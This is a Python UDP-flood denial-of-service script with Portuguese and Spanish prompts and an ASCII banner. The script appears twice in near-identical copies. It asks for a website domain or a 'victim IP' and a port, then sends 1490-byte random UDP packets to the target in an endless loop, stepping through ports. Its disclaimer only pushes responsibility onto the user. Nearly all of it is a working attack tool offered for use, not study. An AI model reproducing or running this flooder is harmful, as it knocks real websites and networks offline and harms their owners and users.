'''
Disclaimer: use esse script com moderação qualquer dano algum a responsabilidade e sua 


criador red play 🅥:
  _         _      _  _     _               _    
 | |__     (_)    | || |   (_)    __ __    (_)   
 | '_ \    | |     \_, |   | |    \ V /    | |   
 |_.__/   _|_|_   _|__/   _|_|_   _\_/_   _|_|_  
_|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
'''



from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.RED+'''
                                                      
          || .---.          || .---.          || .---.          || .---.
          ||/_____/         ||/_____/         ||/_____/         ||/_____/
          ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
          ||_\_-_/_         ||_\_-_/_         ||_\_-_/_         ||_\_-_/_
          :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.
         / ,   |// , `\    / ,   |// , `\    / ,   |// , `\    / ,   |// , `/
        / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |
       /_/||__//   || |  /_/||__//   || |  /_/||__//   || |  /_/||__//   || |
       \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |
        \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
        /\|_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |
        `--|`^"""^`||_|   `--|`^"""^`||_|   `--|`^"""^`||_|   `--|`^"""^`||_|
           |   |   ||/       |   |   ||/       |   |   ||/       |   |   ||/
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           L___l___J         L___l___J         L___l___J         L___l___J
            |_ | _|           |_ | _|           |_ | _|           |_ | _|
           (___|___)         (___|___)         (___|___)         (___|___)       
   '''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+''' 
                            ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
                            ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
                            ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
                            ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
                            ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 

        '''+Style.RESET_ALL+Fore.MAGENTA+Style.BRIGHT+'''
criador red play 🅥 
             
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "Detenido por el usuario..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Por favor revisa tua conexão...'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"carregando verificando sua internet .... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "Detenido por el usuario" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print(Fore.GREEN+Style.BRIGHT+"1."+Style.RESET_ALL+Fore.YELLOW+" Dominio de site personalizado web"+Fore.GREEN+Style.BRIGHT+"\n2."+Style.RESET_ALL+Fore.YELLOW+" derrubar IP"+Fore.GREEN+Style.BRIGHT+"\n3."+Style.RESET_ALL+Fore.YELLOW+" Sair")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"coloque o site exemplo(:google.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+"bote o ip da vítima  : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"thau obrigado por usar minha script:D"+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'erro essa opção não existe'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"Número da porta use 80  : "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"Iniciando...."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+"derrubando IP 🔥 ..."+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"¡Algo deu errado")
        print("Razon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"ip %s enviado %s a através da sua porta:%s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"Terminado\nRazon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\OK"+Fore.RESET)



ddos()
'''
Disclaimer: Este script e so pra 


criador red play 🅥:
  _         _      _  _     _               _    
 | |__     (_)    | || |   (_)    __ __    (_)   
 | '_ \    | |     \_, |   | |    \ V /    | |   
 |_.__/   _|_|_   _|__/   _|_|_   _\_/_   _|_|_  
_|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
'''



from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.RED+'''
                                                      
          || .---.          || .---.          || .---.          || .---.
          ||/_____/         ||/_____/         ||/_____/         ||/_____/
          ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
          ||_\_-_/_         ||_\_-_/_         ||_\_-_/_         ||_\_-_/_
          :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.
         / ,   |// , `\    / ,   |// , `\    / ,   |// , `\    / ,   |// , `/
        / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |
       /_/||__//   || |  /_/||__//   || |  /_/||__//   || |  /_/||__//   || |
       \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |
        \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
        /\|_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |
        `--|`^"""^`||_|   `--|`^"""^`||_|   `--|`^"""^`||_|   `--|`^"""^`||_|
           |   |   ||/       |   |   ||/       |   |   ||/       |   |   ||/
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           L___l___J         L___l___J         L___l___J         L___l___J
            |_ | _|           |_ | _|           |_ | _|           |_ | _|
           (___|___)         (___|___)         (___|___)         (___|___)       
   '''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+''' 
                            ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
                            ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
                            ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
                            ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
                            ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 

        '''+Style.RESET_ALL+Fore.MAGENTA+Style.BRIGHT+'''
criador red play 🅥 
             
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "Detenido por el usuario..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Por favor revisa sua conexão...'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"carregando verificando sua internet .... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "Detenido por el usuario" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print(Fore.GREEN+Style.BRIGHT+"1."+Style.RESET_ALL+Fore.YELLOW+" Dominio de site personalizado web"+Fore.GREEN+Style.BRIGHT+"\n2."+Style.RESET_ALL+Fore.YELLOW+" derrubar IP"+Fore.GREEN+Style.BRIGHT+"\n3."+Style.RESET_ALL+Fore.YELLOW+" Sair")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"coloque o site exemplo(:google.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+"bote o ip da vítima  : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"thau obrigado por usar minha script:D"+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'erro essa opção não existe'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"Número da porta use 80  : "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"Iniciando...."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+"derrubando IP 🔥 ..."+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"¡Algo deu errado")
        print("Razon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"ip %s enviado %s a através da sua porta:%s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"Terminado\nRazon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\OK"+Fore.RESET)



ddos()
